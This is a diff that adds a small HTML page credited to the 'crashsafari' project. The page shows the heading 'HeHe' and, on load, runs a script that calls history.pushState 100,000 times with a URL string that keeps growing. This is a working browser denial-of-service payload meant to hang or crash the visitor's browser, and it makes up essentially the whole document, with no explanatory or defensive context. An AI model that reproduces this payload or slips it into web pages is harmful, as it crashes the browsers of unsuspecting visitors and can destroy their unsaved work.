@@ -1,0 +1,18 @@
+<!--
+    This is taken from https://github.com/stevelacy/crashsafari
+    For more information about how it works, licensing, and
+    attributions, please visit the link
+-->
+
+<html>
+	<body>
+		<h1>HeHe</h1>
+		<script>
+			var total = "";
+			for (var i = 0; i < 100000; i++) {
+				total = total + i.toString();
+				history.pushState(0,0, total);
+			}
+		</script>
+	</body>
+</html>
